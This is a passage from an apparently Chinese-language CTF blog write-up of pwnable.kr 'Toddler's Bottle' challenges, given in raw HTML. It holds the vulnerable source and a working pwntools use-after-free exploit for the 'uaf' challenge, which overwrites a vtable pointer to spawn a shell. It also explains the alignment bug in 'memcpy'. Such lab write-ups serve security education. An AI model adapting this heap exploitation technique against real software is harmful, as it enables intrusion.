class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;name = name;</span><br><span class="line"><span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">Human::introduce();</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">            <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Human::introduce();</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">Human* m = <span class="keyword">new</span> Man(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">Human* w = <span class="keyword">new</span> Woman(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line"><span class="keyword">char</span>* data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(op)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">m-&gt;introduce();</span><br><span class="line">w-&gt;introduce();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">delete</span> m;</span><br><span class="line"><span class="keyword">delete</span> w;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一个很简单的uaf，但是因为是c++所以比较麻烦，不过利用起来还是挺简单的。Human类直接给了一个虚函数，里面就是一个shell，那么直接跳到这个虚表就可以了，通过gdb或者ida都可以查到这个虚函数在虚表中的位置为<em>0x</em>401570。</p><p>在main的主循环中一共有3个功能，use，after和free，use则调用Man类和Woman类的intriduce函数，这个函数刚好就在get_shell+8的位置，如下所示。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/12.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/13.png"></p><p>free则是将最开始new的Man和Woman都free掉，而after则是从一个文件中读取一定数量的字符写入，文件名和读取的数量由argv决定，这里并没有溢出，为了测试方便，我们先假设argv[2]为<code>/dev/stdin</code>，直接从标准输入读取，后面再探讨argv[1]的大小应该为多少合适。main函数中首先new了个Man和Woman，这时候我们看一下堆里面是什么样子。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/10.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/11.png"></p><p>可以看到Man和Woman一共malloc出了4个chunk，每个类各两个，一个0x30大小的和一个0x20大小的chunk，之所以每个类都malloc出两个大小，是因为Human中的name为string类型，在创建string类型之前需要malloc一个chunk出来保存字符串，所以那个0x30大小的chunk保存的是name中的字符串，也就是string类，而0x20大小的chunk中保存了age以及类的虚表指针，其中的0x401570以及0x401550就是这两个类对应的虚表。</p><p>题目名称是uaf，那我们先free掉这4个chunk看看堆里是什么样子。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/14.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/15.png"></p><p>可以看到这4个chunk都进了tcache，并且虚表指针也被破坏了，但是题目重点就在于uaf，因此在free以后，m和w变量依旧指向的是堆上那两个chunk，在调用introduce的时候还是会根据chunk中的虚表指针跳转，那么如果我们可以想办法修改那两个0x20的chunk中的虚表指针，我们再次use，调用introduce的时候就可以控制跳转的地址了。</p><p>现在我们的目标chunk也就是0x20大小的chunk位于tcache中，处于free状态，而通过after功能我们可以malloc一个自定大小的chunk，那么我们如果刚好可以从tcache中malloc出来那个0x20的目标chunk，那么我们就可以控制chunk的内容，也就是虚表指针的地址，修改这个地址为get_shell-8的地址，那么调用introduce的时候在加8，刚好就可以跳转到get_shell的地址。最终的exp如下，需要在tmp中新建一个目录写入exp，然后执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9007</span></span><br><span class="line"></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/uaf/uaf&quot;</span>)</span><br><span class="line"><span class="comment"># pg = cyclic_gen()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(env=env, argv=[elf.path, str(<span class="number">0x10</span>), <span class="string">&#x27;/dev/stdin&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use</span>():</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">after</span>(<span class="params">data</span>):</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    conn.send(data)</span><br><span class="line">    print(conn.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    conn.sendlineafter(<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">after(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">after(p64(<span class="number">0x401570</span><span class="number">-8</span>) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>&gt;&gt;<span class="number">1</span>))</span><br><span class="line">use()</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="memcpy-10-pt"><a href="#memcpy-10-pt" class="headerlink" title="memcpy (10 pt)"></a>memcpy (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">dest[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="comment">// 64-byte block fast copy</span></span><br><span class="line"><span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">i = len / <span class="number">64</span>;</span><br><span class="line">len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">__asm__ __volatile__ (</span><br><span class="line"><span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line"><span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line"><span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">dest += <span class="number">64</span>;</span><br><span class="line">src += <span class="number">64</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// byte-to-byte slow copy</span></span><br><span class="line"><span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line"><span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line"><span class="keyword">int</span> e;</span><br><span class="line"><span class="keyword">char</span>* src;</span><br><span class="line"><span class="keyword">char</span>* dest;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="comment">// allocate memory</span></span><br><span class="line"><span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setup experiment parameters</span></span><br><span class="line"><span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;<span class="comment">// 2^13 = 8K</span></span><br><span class="line">low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between %d ~ %d : &quot;</span>, low, high);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">sizes[i++] = size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// run experiment</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">size = sizes[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;experiment %d : memcpy with buffer size %d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">slow_memcpy(dest, src, size);<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);<span class="comment">// to eliminate cache effect</span></span><br><span class="line">t1 = rdtsc();</span><br><span class="line">fast_memcpy(dest, src, size);<span class="comment">// block-to-block memcpy</span></span><br><span class="line">t2 = rdtsc();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码实现了两种不同的memcpy，要求我们帮忙测试一下，需要我们输入10个size，这10个size的范围如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">8 16</span><br><span class="line">16 32</span><br><span class="line">32 64</span><br><span class="line">64 128</span><br><span class="line">128 256</span><br><span class="line">256 512</span><br><span class="line">512 1024</span><br><span class="line">1024 2048</span><br><span class="line">2048 4096</span><br><span class="line">4096 8192</span><br></pre></td></tr></table></figure><p>10个size，一共进行10次测试，每次测试分别使用slow_memcpy和fast_memcpy拷贝size大小的内存到malloc出来的一块size大小的dest里，只要我们能把这10次测试都做完，就能拿到flag，理论上size越小，测试越快，那我们先试一试用范围内最小的size，<code>8 16 32 64 128 256 512 1024 2048 4096</code>，但是只能进行4次半测试就退出了，表示程序执行第5次测试的fast_memcpy的时候出现了问题。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/16.png"></p><p>slow_memcpy非常简单，直接用数组一个元素一个元素的赋值，而fast_memcpy则是在汇编层面上用movdqa和movntps以64字节为一块的单位拷贝，先看一下movdqa和movntps这两个指令都是在干什么。</p><blockquote><p>movdqa:</p><p>Moves 128, 256 or 512 bits of packed doubleword/quadword integer values from the source operand (the second operand) to the destination operand (the first operand). This instruction can be used to load a vector register from an int32/int64 memory location, to store the contents of a vector register into an int32/int64 memory location, or to move data between two ZMM registers. When the source or destination operand is a memory operand, the operand must be aligned on a 16 (EVEX.128)/32(EVEX.256)/64(EVEX.512)-byte boundary or a general-protection exception (#GP) will be generated. To move integer data to and from unaligned memory locations, use the VMOVDQU instruction.</p><p>movntps:</p><p>Moves the packed single-precision floating-point values in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to prevent caching of the data during the write to memory. The source operand is an XMM register, YMM register or ZMM register, which is assumed to contain packed single-precision, floating-pointing. The destination operand is a 128-bit, 256-bit or 512-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</p></blockquote><p>movdqa可以从src移动16字节，32字节或64字节的打包的双字或四字整数到dst，当src是一个来自内存中的数据时，该数据必须以16字节，32字节或64字节对齐。movntps可以从src移动打包的单精度浮点数到dst，当src或dst是一个内存中的数据时，需要以16字节，32字节或64字节对齐。在fast_memcpy中，若要拷贝的大小超过64字节时，使用movdqa将一个64字节来自内存的块数据分别移动16字节到4个寄存器中，然后使用movntps从这4个寄存器中每次移动16字节到目标内存中，因此，src和dst在内存中必须以16字节对齐。</p><p>源码里直接给了编译命令<code>gcc -o memcpy memcpy.c -m32 -lm</code>，本地手动编译，输入刚才的数据执行，发现没有任何问题。最后实在无奈看了网上别人的writeup，这个程序的主要问题在于内存对齐，movdqa和movntps都要求内存数据16字节对齐，而在编译命令中指明这是32位的程序，默认8字节对齐，因此在使用fast_memcpy的时候，malloc出来的chunk的<strong>内存位置</strong>（注意不是chunk的size）并不是16字节对齐，所以我们就需要从size为64字节开始，手动加上8调整内存中的chunk为16字节对齐，最后的size为<code>8 16 32 72 136 264 520 1032 2056 4096</code>。至于为什么本地编译32位程序执行没有出错，目前尚不清楚。</p><h1 id="asm-6-pt"><a href="#asm-6-pt" class="headerlink" title="asm (6 pt)"></a>asm (6 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 